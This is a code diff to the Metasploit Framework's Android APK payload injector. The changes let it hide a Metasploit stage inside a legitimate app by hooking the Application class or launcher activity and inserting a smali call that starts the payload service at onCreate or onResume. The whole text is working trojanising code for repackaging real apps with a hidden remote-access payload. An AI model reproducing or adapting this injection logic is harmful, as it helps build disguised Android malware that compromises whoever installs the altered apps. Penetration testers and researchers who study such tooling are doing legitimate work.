@@ -185,33 +185,36 @@ class Msf::Payload::Apk
     amanifest = parse_manifest("#{tempdir}/original/AndroidManifest.xml")
 
     print_status "Locating hook point..\n"
-    launcheractivity = find_launcher_activity(amanifest)
-    unless launcheractivity
-      raise RuntimeError, "Unable to find hookable activity in #{apkfile}\n"
+    app_package = amanifest.xpath("//manifest").first['package']
+    app_application = amanifest.xpath('//manifest/application')
+
+    hook_class = app_application.attribute("name")
+    if hook_class
+      hook_class = hook_class.to_s
+    else
+      hook_class = find_launcher_activity(amanifest)
     end
-    smalifile = "#{tempdir}/original/smali*/" + launcheractivity.gsub(/\./, "/") + ".smali"
+    unless hook_class
+      raise RuntimeError, "Unable to find hookable class in #{apkfile}\n"
+    end
+
+    smalifile = "#{tempdir}/original/smali*/" + hook_class.gsub(/\./, "/") + ".smali"
     smalifiles = Dir.glob(smalifile)
     for smalifile in smalifiles
       if File.readable?(smalifile)
-        activitysmali = File.read(smalifile)
+        hooksmali = File.read(smalifile)
       end
     end
 
-    unless activitysmali
+    unless hooksmali
       raise RuntimeError, "Unable to find hook point in #{smalifiles}\n"
-    end
-
-    entrypoint = ';->onCreate(Landroid/os/Bundle;)V'
-    unless activitysmali.include? entrypoint
-      raise RuntimeError, "Unable to find onCreate() in #{smalifile}\n"
     end
 
     # Remove unused files
     FileUtils.rm "#{tempdir}/payload/smali/com/metasploit/stage/MainActivity.smali"
     FileUtils.rm Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/R*.smali")
 
-    package = amanifest.xpath("//manifest").first['package']
-    package = package + ".#{Rex::Text::rand_text_alpha_lower(5)}"
+    package = app_package + ".#{Rex::Text::rand_text_alpha_lower(5)}"
     package_slash = package.gsub(/\./, "/")
     print_status "Adding payload as package #{package}\n"
     payload_files = Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/*.smali")
@@ -226,10 +229,24 @@ class Msf::Payload::Apk
       File.open(newfilename, "wb") {|file| file.puts newsmali }
     end
 
-    payloadhook = entrypoint + %Q^
+    # Append smali to one of the these entrypoints
+    entrypoints = [ ';->onCreate(Landroid/os/Bundle;)V', ';->onCreate()V', ';->onResume()V' ]
+    for checkentrypoint in entrypoints
+      if hooksmali.include? checkentrypoint
+        entrypoint = checkentrypoint
+        break
+      end
+    end
+
+    unless entrypoint
+      raise RuntimeError, "Unable to find any entrypoint in #{smalifile}\n"
+    end
+
+    payloadhook = entrypoint + 
+    %Q^
     invoke-static {p0}, L#{package_slash}/MainService;->startService(Landroid/content/Context;)V
     ^
-    hookedsmali = activitysmali.gsub(entrypoint, payloadhook)
+    hookedsmali = hooksmali.gsub(entrypoint, payloadhook)
 
     print_status "Loading #{smalifile} and injecting payload..\n"
     File.open(smalifile, "wb") {|file| file.puts hookedsmali }
